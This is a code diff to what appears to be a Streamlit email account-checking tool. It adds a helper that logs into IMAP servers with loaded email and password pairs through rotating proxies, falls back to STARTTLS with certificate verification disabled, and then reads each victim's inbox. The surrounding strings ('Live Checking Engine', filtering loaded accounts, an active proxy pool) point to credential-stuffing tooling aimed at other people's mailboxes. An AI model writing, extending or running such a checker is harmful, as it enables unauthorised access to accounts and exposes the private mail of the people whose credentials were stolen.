@@ -927,19 +927,53 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
         pass
     mail.quit()
 
-def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
-    try:
-        class PIMAP(imaplib.IMAP4_SSL):
-            def open(self, host="", port=993, timeout=None):
-                raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
-                raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                self.sock = ssl_wrap(raw, host, insecure=True)
+# --- True Credential Verification Helper ---
+def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
+    """
+    Helper function to test and establish a verified IMAP connection.
+    Attempts a secure SSL connection on port 993 with fallback to STARTTLS on port 143.
+    """
+    for h in hosts:
+        try:
+            class PIMAPVerify(imaplib.IMAP4_SSL):
+                def open(self, host="", port=993, timeout=None):
+                    raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
+                    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                    self.sock = ssl_wrap(raw, host, insecure=True)
+                    try:
+                        self.file = self.sock.makefile("rb")
+                    except Exception:
+                        pass
+            mail = PIMAPVerify(h, timeout=10)
+            mail.login(target_email, target_pass)
+            return True, mail, h
+        except Exception:
+            try:
+                # Fallback to STARTTLS on port 143
+                raw_conn = proxy_connect(h, 143, proxy_str) if proxy_str else socket.create_connection((h, 143), timeout=10)
+                raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                mail = imaplib.IMAP4()
+                mail.sock = raw_conn
                 try:
-                    self.file = self.sock.makefile("rb")
+                    mail.file = mail.sock.makefile("rb")
                 except Exception:
                     pass
-        mail = PIMAP(server, timeout=10)
-        mail.login(email, password)
+                mail.welcome = mail._getresp()
+                mail.starttls(ssl_context=ssl._create_unverified_context())
+                mail.login(target_email, target_pass)
+                return True, mail, h
+            except Exception:
+                continue
+    return False, None, ""
+
+def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
+    try:
+        # Integrated True Credential Verification before reading the inbox
+        conf_hosts = get_servers(email).get("imap", [server])
+        verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
+        if not verified or not mail:
+            return ["Error reading mailbox: True credential verification failed (Invalid credentials or blocked port)."]
+        
         mail.select("INBOX")
         typ, data = mail.search(None, "ALL")
         if typ != "OK":
@@ -1126,7 +1160,7 @@ str_lit.markdown("### 🚀 Execute Live Checking Engine")
 
 if str_lit.button("🔥 Start Live Checking Engine", type="primary"):
     if not clean_lines:
-        str_lit.warning("⚠️ Please load and filter accounts first.")
+        str_lit.warning("⚠️️ Please load and filter accounts first.")
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
